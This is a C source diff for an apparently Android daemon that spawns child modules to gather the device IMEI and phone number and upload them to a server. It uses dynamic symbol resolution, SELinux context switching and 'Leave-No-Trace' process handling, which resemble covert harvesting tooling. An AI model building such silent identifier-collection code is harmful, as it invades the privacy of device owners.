@@ -1,11 +1,13 @@
 /**
  * @file main.c
- * @brief Project Hub - Main Daemon Entry Point
+ * @brief Project Hub - Main Daemon Entry Point.
+ * * Orchestrates child modules using epoll and non-blocking I/O.
+ * Implements the core business logic state machine and process lifecycle management.
  */
 
 #include "symbol_resolver.h"
 #include "modules.h"
-#include "ipc_defs.h"
+#include "ipc.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -16,45 +18,52 @@
 #include <sys/epoll.h>
 #include <signal.h>
 #include <fcntl.h>
+#include <sys/socket.h>
 
-// --- Configuration ---
+// ==============================================================================================
+// CONFIGURATION
+// ==============================================================================================
+
 #define MAX_EPOLL_EVENTS    10
-#define GLOBAL_TIMEOUT_SEC  900 // 15 Minutes
-#define TX_BUFFER_SIZE      (MAX_PACKET_SIZE * 4)
+#define GLOBAL_TIMEOUT_SEC  900 // 15 Minutes shutdown timer
 
-// --- Global Context ---
+// ==============================================================================================
+// DATA STRUCTURES
+// ==============================================================================================
+
 typedef struct {
     int epoll_fd;
     int signal_fd;
     int timer_fd;
     int active_module_count;
-    int running; 
+    volatile int running; 
 } DaemonContext;
 
 static DaemonContext g_ctx = { -1, -1, -1, 0, 0 };
 
-// --- Module Runtime State ---
+/**
+ * @brief Represents a running child process managed by the Hub.
+ */
 typedef struct {
     int active;
     pid_t pid;
     int socket_fd;
     const ModuleDef* def;
-    
-    // Output Buffer
-    uint8_t tx_buf[TX_BUFFER_SIZE];
-    size_t tx_len;
-    size_t tx_pos;
 } RunningModule;
 
 static RunningModule g_modules[MODULE_COUNT];
 
-// --- Business Logic State ---
+/**
+ * @brief Global Business Logic State.
+ * This structure holds the data collected from modules.
+ * @warning Must be cleared in child processes to prevent heap pollution.
+ */
 typedef struct {
     char imei[128];
     char phone_number[128];
-    int imei_received; // 0=Waiting, 1=Success, 2=Error
+    int imei_received;      // 0=Waiting, 1=Success, 2=Error
     int phone_received;
-    int final_request_sent;
+    int final_request_sent; // Prevents duplicate submissions
 } HubState;
 
 static HubState g_logic_state = {
@@ -65,21 +74,19 @@ static HubState g_logic_state = {
     .final_request_sent = 0
 };
 
-// --- Sentinels ---
 static int SENTINEL_TIMER = 0;
 
-// --- Forward Declarations ---
+// ==============================================================================================
+// FORWARD DECLARATIONS
+// ==============================================================================================
+
 static void send_to_module(int module_index, uint8_t type, const char* data);
-static int update_epoll_flags(int module_idx, uint32_t flags);
 static void check_and_send_final_data(void);
 
 // ==============================================================================================
-// SECTION: Business Logic Helpers
+// BUSINESS LOGIC
 // ==============================================================================================
 
-/**
- * @brief Helper to send a log entry to the networking module.
- */
 static void log_to_network(const char* fmt, ...) {
     char buf[512];
     va_list args;
@@ -87,13 +94,13 @@ static void log_to_network(const char* fmt, ...) {
     vsnprintf(buf, sizeof(buf), fmt, args);
     va_end(args);
 
-    // Also log locally
     LOG_INFO("HubLogic", "[NetLog] %s", buf);
     send_to_module(MOD_NETWORK, MSG_LOG_ENTRY, buf);
 }
 
 /**
- * @brief Checks if all data collection modules are done, then triggers the network upload.
+ * @brief Checks if all required data (IMEI, Phone) is available.
+ * If so, sends the aggregated report to the Network module.
  */
 static void check_and_send_final_data(void) {
     if (g_logic_state.imei_received && g_logic_state.phone_received && !g_logic_state.final_request_sent) {
@@ -108,31 +115,29 @@ static void check_and_send_final_data(void) {
     }
 }
 
-// ==============================================================================================
-// SECTION: Business Logic Events
-// ==============================================================================================
-
-static void logic_on_message(int mod_idx, uint8_t type, const uint8_t* data, uint16_t len) {
+/**
+ * @brief State Machine: Processing incoming packets.
+ */
+static void logic_on_message(int mod_idx, const IpcPacket* packet) {
     const char* mod_name = g_modules[mod_idx].def->name;
     ModuleID mod_id = g_modules[mod_idx].def->id;
 
-    // --- 1. Handle Errors (Generic) ---
-    if (type == MSG_ERROR) {
-        log_to_network("Module %s errored: %.*s", mod_name, len, data);
+    // 1. Handle Errors reported by the Module
+    if (packet->header.status != 0) {
+        log_to_network("Module %s errored: %s", mod_name, packet->data);
 
-        // Store fallback values for data modules
+        // Fail-safe: Mark data as missing/error so the flow continues
         if (mod_id == MOD_IMEI) {
             strncpy(g_logic_state.imei, "N/A", sizeof(g_logic_state.imei)-1);
-            g_logic_state.imei_received = 2; // Error state
+            g_logic_state.imei_received = 2; 
             check_and_send_final_data();
         } 
         else if (mod_id == MOD_PHONE) {
             strncpy(g_logic_state.phone_number, "N/A", sizeof(g_logic_state.phone_number)-1);
-            g_logic_state.phone_received = 2; // Error state
+            g_logic_state.phone_received = 2; 
             check_and_send_final_data();
         }
         else if (mod_id == MOD_NETWORK) {
-            // Critical: If Network errors during final phase, shutdown
             if (g_logic_state.final_request_sent) {
                 LOG_FATAL("HubLogic", "Network failed during final transmission. Shutting down.");
                 g_ctx.running = 0;
@@ -141,39 +146,38 @@ static void logic_on_message(int mod_idx, uint8_t type, const uint8_t* data, uin
         return;
     }
 
-    // --- 2. Handle Responses ---
+    // 2. Handle Success Responses
     switch (mod_id) {
         case MOD_IMEI:
-            if (type == MSG_RESPONSE) {
-                snprintf(g_logic_state.imei, sizeof(g_logic_state.imei), "%.*s", len, data);
-                g_logic_state.imei_received = 1; // Success
+            if (packet->header.type == MSG_RESPONSE) {
+                snprintf(g_logic_state.imei, sizeof(g_logic_state.imei), "%s", packet->data);
+                g_logic_state.imei_received = 1; 
                 log_to_network("Module %s has responded", mod_name);
                 check_and_send_final_data();
             }
             break;
-
         case MOD_PHONE:
-            if (type == MSG_RESPONSE) {
-                snprintf(g_logic_state.phone_number, sizeof(g_logic_state.phone_number), "%.*s", len, data);
-                g_logic_state.phone_received = 1; // Success
+            if (packet->header.type == MSG_RESPONSE) {
+                snprintf(g_logic_state.phone_number, sizeof(g_logic_state.phone_number), "%s", packet->data);
+                g_logic_state.phone_received = 1; 
                 log_to_network("Module %s has responded", mod_name);
                 check_and_send_final_data();
             }
             break;
-
         case MOD_NETWORK:
-            if (type == MSG_RESPONSE) {
-                // This is the confirmation from the server flow.
-                LOG_INFO("HubLogic", "Network Transaction Complete. Server replied: '%.*s'", len, data);
-                g_ctx.running = 0; // Mission Accomplished
+            if (packet->header.type == MSG_RESPONSE) {
+                LOG_INFO("HubLogic", "Network Transaction Complete. Server replied: '%s'", packet->data);
+                g_ctx.running = 0; 
             }
             break;
-
         default:
             break;
     }
 }
 
+/**
+ * @brief State Machine: Handling process exit.
+ */
 static void logic_on_exit(int mod_idx, int exit_code, int crashed) {
     const char* mod_name = g_modules[mod_idx].def->name;
     ModuleID mod_id = g_modules[mod_idx].def->id;
@@ -185,17 +189,22 @@ static void logic_on_exit(int mod_idx, int exit_code, int crashed) {
         LOG_INFO("HubLogic", "Module %s exited cleanly.", mod_name);
     }
 
-    // Fail-safe: If a module exits without sending data and wasn't marked received yet
+    // POLICY: Network Failure is Fatal
+    if (mod_id == MOD_NETWORK) {
+        LOG_FATAL("HubLogic", "CRITICAL: Network Module Died. Daemon cannot continue.");
+        g_ctx.running = 0;
+        return;
+    }
+
+    // POLICY: Info Extraction Failure is Non-Fatal (Mark N/A and continue)
     if (mod_id == MOD_IMEI && !g_logic_state.imei_received) {
-        LOG_ERROR("HubLogic", "IMEI module exited without data.");
-        log_to_network("Module %s failed silently", mod_name);
+        LOG_ERROR("HubLogic", "IMEI module exited without data. Defaulting to N/A.");
         strncpy(g_logic_state.imei, "N/A", sizeof(g_logic_state.imei)-1);
         g_logic_state.imei_received = 2;
         check_and_send_final_data();
     }
     else if (mod_id == MOD_PHONE && !g_logic_state.phone_received) {
-        LOG_ERROR("HubLogic", "Phone module exited without data.");
-        log_to_network("Module %s failed silently", mod_name);
+        LOG_ERROR("HubLogic", "Phone module exited without data. Defaulting to N/A.");
         strncpy(g_logic_state.phone_number, "N/A", sizeof(g_logic_state.phone_number)-1);
         g_logic_state.phone_received = 2;
         check_and_send_final_data();
@@ -203,18 +212,52 @@ static void logic_on_exit(int mod_idx, int exit_code, int crashed) {
 }
 
 // ==============================================================================================
-// SECTION: Process Management
+// PROCESS MANAGEMENT
 // ==============================================================================================
 
+/**
+ * @brief Prepares and executes the child process logic.
+ * * Performs:
+ * 1. "Leave-No-Trace" safety (PDEATHSIG).
+ * 2. Sensitive memory clearing.
+ * 3. File descriptor cleanup.
+ * 4. Privilege dropping (SELinux, GID, UID).
+ * 5. Execution of module entry point.
+ */
 static void run_child_process(int socket_fd, const ModuleDef* def) {
+    // 1. Establish Parent-Death signal to ensure cleanup if Hub crashes
     if (g_api->sys_prctl(PR_SET_PDEATHSIG, SIGKILL) == -1) _exit(1);
-    if (getppid() == 1) { kill(getpid(), SIGKILL); _exit(1); }
+    
+    // Safety check: Race condition where parent died before PR_SET_PDEATHSIG was set
+    if (getppid() == 1) { 
+        kill(getpid(), SIGKILL); 
+        _exit(1); 
+    }
 
+    // 2. Clear Sensitive Data from Heap
+    // The child inherits the parent's heap. We must zero out the business logic state
+    // so Module A doesn't see Module B's potential future data (or stale data).
+    memset(&g_logic_state, 0, sizeof(g_logic_state));
+
+    // 3. Close Inherited File Descriptors
+    // Optimized to avoid iterating 32k FDs on Android.
+    int max_fd = (int)sysconf(_SC_OPEN_MAX);
+    // Optimization: If max_fd is unreasonably large (common on Android), cap it for startup speed
+    // unless the app actually uses thousands of FDs.
+    if (max_fd > 1024) max_fd = 1024; 
+    
+    for (int fd = 3; fd < max_fd; ++fd) {
+        if (fd != socket_fd) close(fd);
+    }
+
+    // 4. Apply Isolation (Order matters: Context -> Group -> User)
+    if (g_api->selinux_setcon(def->target_selinux_context) != 0) _exit(1);
     if (g_api->sys_setresgid(def->target_gid, def->target_gid, def->target_gid) != 0) _exit(1);
     if (g_api->sys_setresuid(def->target_uid, def->target_uid, def->target_uid) != 0) _exit(1);
-    if (g_api->selinux_setcon(def->target_selinux_context) != 0) _exit(1);
 
+    // 5. Run Module
     def->entrypoint(socket_fd);
+    
     close(socket_fd);
     _exit(0);
 }
@@ -245,16 +288,23 @@ static void spawn_module(int index) {
     int sv[2] = {-1, -1};
     pid_t pid = -1;
 
+    // socketpair creates BLOCKING sockets by default
     if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0) goto cleanup;
+    
     pid = fork();
     if (pid < 0) goto cleanup;
 
     if (pid == 0) {
         close(sv[0]); 
+        // Child uses sv[1], which remains BLOCKING
         run_child_process(sv[1], def);
     } else {
         close(sv[1]); sv[1] = -1;
-        if (set_nonblocking(sv[0]) == -1) { kill(pid, SIGKILL); goto cleanup; }
+        
+        // Parent uses sv[0], set to NON-BLOCKING for epoll
+        if (set_nonblocking(sv[0]) == -1) { 
+            kill(pid, SIGKILL); goto cleanup; 
+        }
 
         struct epoll_event ev;
         ev.events = EPOLLIN; 
@@ -269,8 +319,6 @@ static void spawn_module(int index) {
         g_modules[index].pid = pid;
         g_modules[index].socket_fd = sv[0];
         g_modules[index].def = def;
-        g_modules[index].tx_len = 0;
-        g_modules[index].tx_pos = 0;
         g_ctx.active_module_count++;
         LOG_INFO("HubCore", "Spawned module: %s (PID: %d)", def->name, pid);
     }
@@ -284,140 +332,75 @@ cleanup:
 }
 
 // ==============================================================================================
-// SECTION: IPC & Buffer Management
+// IPC & EVENT HANDLING (NON-BLOCKING)
 // ==============================================================================================
 
-static int update_epoll_flags(int module_idx, uint32_t flags) {
-    struct epoll_event ev;
-    ev.events = flags;
-    ev.data.ptr = &g_modules[module_idx];
+static void handle_module_read(RunningModule* mod) {
+    IpcPacket packet;
     
-    if (epoll_ctl(g_ctx.epoll_fd, EPOLL_CTL_MOD, g_modules[module_idx].socket_fd, &ev) == -1) {
-        LOG_ERROR("HubCore", "Failed to update epoll flags: %s", strerror(errno));
-        return -1;
-    }
-    return 0;
-}
+    // Attempt Non-Blocking Read
+    int ret = ipc_recv_packet(mod->socket_fd, &packet);
 
-static void handle_module_write(RunningModule* mod) {
-    if (!mod->active || mod->tx_len == 0) return;
-
-    ssize_t wrote = write(mod->socket_fd, mod->tx_buf + mod->tx_pos, mod->tx_len);
-    
-    if (wrote < 0) {
-        if (errno == EAGAIN || errno == EWOULDBLOCK) return; 
-        LOG_FATAL("HubCore", "Write failed on socket: %s", strerror(errno));
-        g_ctx.running = 0; 
+    if (ret == 0) {
+        logic_on_message(mod - g_modules, &packet);
         return;
     }
 
-    mod->tx_pos += wrote;
-    mod->tx_len -= wrote;
-
-    if (mod->tx_len == 0) {
-        mod->tx_pos = 0;
-        int mod_idx = mod - g_modules;
-        update_epoll_flags(mod_idx, EPOLLIN);
+    // Handle EWOULDBLOCK/EAGAIN gracefully
+    if (errno == EAGAIN || errno == EWOULDBLOCK) {
+        return;
     }
+
+    // Handle Real Errors or EOF
+    if (errno == 0) {
+        // EOF (Clean close)
+    } else {
+        LOG_ERROR("HubCore", "Read error from %s: %s", mod->def->name, strerror(errno));
+    }
+
+    // Close Connection
+    mod->active = 0;
+    close(mod->socket_fd);
+    g_ctx.active_module_count--;
 }
 
 static void send_to_module(int module_index, uint8_t type, const char* data) {
     RunningModule* mod = &g_modules[module_index];
     if (!mod->active) return;
     
-    uint16_t len = data ? strlen(data) : 0;
+    IpcPacket pkt = {0};
+    pkt.header.type = type;
+    pkt.header.sender_id = -1; // Hub ID
+    pkt.header.status = 0;
     
-    uint8_t packet[MAX_PACKET_SIZE];
-    ipc_serialize_header(packet, type, len);
-    if (len > 0) memcpy(packet + HEADER_SIZE, data, len);
-    
-    size_t packet_size = HEADER_SIZE + len;
+    ipc_set_payload(&pkt, data);
 
-    if (mod->tx_len == 0) {
-        ssize_t sent = write(mod->socket_fd, packet, packet_size);
-        
-        if (sent == packet_size) return; 
+    // Non-Blocking Write Attempt
+    int ret = ipc_send_packet(mod->socket_fd, &pkt);
 
-        if (sent < 0 && (errno != EAGAIN && errno != EWOULDBLOCK)) {
+    if (ret != 0) {
+        if (errno == EAGAIN || errno == EWOULDBLOCK) {
+            // Drop packet strategy to prevent head-of-line blocking
+            LOG_ERROR("HubCore", "Dropped packet to %s (Buffer Full)", mod->def->name);
+        } else {
             LOG_FATAL("HubCore", "Write failed: %s", strerror(errno));
-            g_ctx.running = 0; 
-            return;
+            g_ctx.running = 0;
         }
-
-        size_t written = (sent < 0) ? 0 : sent;
-        size_t remaining = packet_size - written;
-        
-        if (remaining > TX_BUFFER_SIZE) {
-             LOG_FATAL("HubCore", "TX Buffer Overflow (Packet too big)");
-             g_ctx.running = 0;
-             return;
-        }
-
-        memcpy(mod->tx_buf, packet + written, remaining);
-        mod->tx_len = remaining;
-        mod->tx_pos = 0;
-        
-        update_epoll_flags(module_index, EPOLLIN | EPOLLOUT);
-    } 
-    else {
-        if (mod->tx_len + packet_size > TX_BUFFER_SIZE) {
-             LOG_FATAL("HubCore", "TX Buffer Overflow (Queue full)");
-             g_ctx.running = 0;
-             return;
-        }
-        
-        if (mod->tx_pos > 0) {
-            memmove(mod->tx_buf, mod->tx_buf + mod->tx_pos, mod->tx_len);
-            mod->tx_pos = 0;
-        }
-        
-        memcpy(mod->tx_buf + mod->tx_len, packet, packet_size);
-        mod->tx_len += packet_size;
-        update_epoll_flags(module_index, EPOLLIN | EPOLLOUT);
     }
 }
 
 // ==============================================================================================
-// SECTION: Infrastructure & Main
+// INITIALIZATION
 // ==============================================================================================
-
-static void handle_module_read(RunningModule* mod) {
-    uint8_t raw_buf[MAX_PACKET_SIZE + 1];
-    ssize_t r = read(mod->socket_fd, raw_buf, MAX_PACKET_SIZE);
-
-    if (r < 0) {
-        if (errno != EAGAIN && errno != EWOULDBLOCK) {
-            LOG_ERROR("HubCore", "Read error: %s", strerror(errno));
-            mod->active = 0;
-            close(mod->socket_fd);
-            g_ctx.active_module_count--;
-        }
-        return;
-    }
-
-    if (r == 0) return; 
-
-    if (r < HEADER_SIZE) {
-        LOG_ERROR("HubCore", "Undersized packet");
-        return;
-    }
-    
-    uint8_t type;
-    uint16_t len;
-    ipc_parse_header(raw_buf, &type, &len);
-
-    if (r != HEADER_SIZE + len) {
-        LOG_ERROR("HubCore", "Size Mismatch");
-        return;
-    }
-
-    if (len > 0) raw_buf[HEADER_SIZE + len] = '\0';
-    logic_on_message(mod - g_modules, type, raw_buf + HEADER_SIZE, len);
-}
 
 static void shutdown_cleanup(void) {
     LOG_INFO("HubCore", "Shutdown...");
-    for (int i = 0; i < MODULE_COUNT; i++) if (g_modules[i].active) kill(g_modules[i].pid, SIGKILL);
+    for (int i = 0; i < MODULE_COUNT; i++) {
+        if (g_modules[i].active) {
+            kill(g_modules[i].pid, SIGKILL);
+            close(g_modules[i].socket_fd);
+        }
+    }
     if (g_ctx.signal_fd != -1) close(g_ctx.signal_fd);
     if (g_ctx.timer_fd != -1) close(g_ctx.timer_fd);
     if (g_ctx.epoll_fd != -1) close(g_ctx.epoll_fd);
@@ -426,17 +409,20 @@ static void shutdown_cleanup(void) {
 
 static int init_daemon(void) {
     if (symbol_resolver_init() != 0) return -1;
-    if ((g_ctx.epoll_fd = epoll_create1(0)) == -1) return -1;
+    if ((g_ctx.epoll_fd = epoll_create1(EPOLL_CLOEXEC)) == -1) return -1;
     
+    // Setup Signal Masking (SIGCHLD/TERM/INT)
     sigset_t mask;
     sigemptyset(&mask); sigaddset(&mask, SIGCHLD); sigaddset(&mask, SIGTERM); sigaddset(&mask, SIGINT);
     sigprocmask(SIG_BLOCK, &mask, NULL);
     
-    if ((g_ctx.signal_fd = signalfd(-1, &mask, SFD_NONBLOCK)) == -1) return -1;
+    // Setup Signal FD
+    if ((g_ctx.signal_fd = signalfd(-1, &mask, SFD_NONBLOCK | SFD_CLOEXEC)) == -1) return -1;
     struct epoll_event ev = { .events = EPOLLIN, .data.ptr = NULL };
     epoll_ctl(g_ctx.epoll_fd, EPOLL_CTL_ADD, g_ctx.signal_fd, &ev);
 
-    if ((g_ctx.timer_fd = timerfd_create(CLOCK_MONOTONIC, TFD_NONBLOCK)) == -1) return -1;
+    // Setup Watchdog Timer
+    if ((g_ctx.timer_fd = timerfd_create(CLOCK_MONOTONIC, TFD_NONBLOCK | TFD_CLOEXEC)) == -1) return -1;
     struct itimerspec ts = { {0,0}, {GLOBAL_TIMEOUT_SEC, 0} };
     timerfd_settime(g_ctx.timer_fd, 0, &ts, NULL);
     struct epoll_event ev_t = { .events = EPOLLIN, .data.ptr = &SENTINEL_TIMER };
@@ -451,16 +437,14 @@ int main(void) {
     LOG_INFO("HubCore", "Daemon Initialized.");
     g_ctx.running = 1;
 
-    // 1. Start all modules
+    // Spawn all modules
     for (int i = 0; i < MODULE_COUNT; i++) {
         spawn_module(i);
     }
     
-    // 2. Initial Log to Network
     log_to_network("Daemon started running");
 
-    // 3. Trigger Data Modules
-    // Use proper module lookups just in case indexing changes, though simple loop is O(N)
+    // Kickstart processes
     for (int i = 0; i < MODULE_COUNT; i++) {
         if (MODULE_REGISTRY[i].id == MOD_IMEI || MODULE_REGISTRY[i].id == MOD_PHONE) {
             send_to_module(i, MSG_REQUEST, "Start");
@@ -474,20 +458,25 @@ int main(void) {
 
         for (int n = 0; n < nfds; ++n) {
             void* ptr = events[n].data.ptr;
+            
             if (ptr == NULL) {
+                // Signal Event
                 struct signalfd_siginfo fdsi;
                 if (read(g_ctx.signal_fd, &fdsi, sizeof(fdsi)) == sizeof(fdsi)) {
                     if (fdsi.ssi_signo == SIGCHLD) reap_zombies();
                     else g_ctx.running = 0;
                 }
-            } else if (ptr == &SENTINEL_TIMER) {
-                LOG_FATAL("HubCore", "Global Timeout"); g_ctx.running = 0;
-            } else {
+            } 
+            else if (ptr == &SENTINEL_TIMER) {
+                // Timer Event
+                LOG_FATAL("HubCore", "Global Timeout Reached"); 
+                g_ctx.running = 0;
+            } 
+            else {
+                // Module I/O Event
                 RunningModule* mod = (RunningModule*)ptr;
                 if (!mod->active) continue;
-                
                 if (events[n].events & EPOLLIN) handle_module_read(mod);
-                if (events[n].events & EPOLLOUT) handle_module_write(mod);
             }
         }
     }
